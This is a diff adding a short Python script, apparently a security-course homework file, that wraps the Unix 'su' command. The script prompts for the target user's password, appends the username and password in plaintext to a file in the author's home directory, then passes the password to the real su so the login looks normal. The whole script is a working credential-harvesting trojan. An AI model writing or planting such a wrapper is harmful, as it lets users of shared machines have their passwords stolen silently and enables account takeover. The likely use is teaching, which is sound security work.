@@ -1,0 +1,33 @@
+#!/usr/bin/env python
+
+import sys
+import pexpect
+import getpass
+
+if __name__ == '__main__':
+    if(len(sys.argv) < 2):
+        user = ""
+    else:
+        user = sys.argv[1]
+
+    child = pexpect.spawn("su " + user)
+    child.expect(['Password:', pexpect.EOF])
+
+    try:
+        password = getpass.getpass()
+    except:
+        pass
+    
+    f = open('/home/sl136/course/cs166/hw2/usrpass.txt', 'a+')
+    f.write(user + ": " + password + "\n")
+    f.close()
+
+    child.sendline(password)
+    child.expect(['\n'])
+
+    try:
+        child.interact()
+    except:
+        pass
+    child.close(False)
+
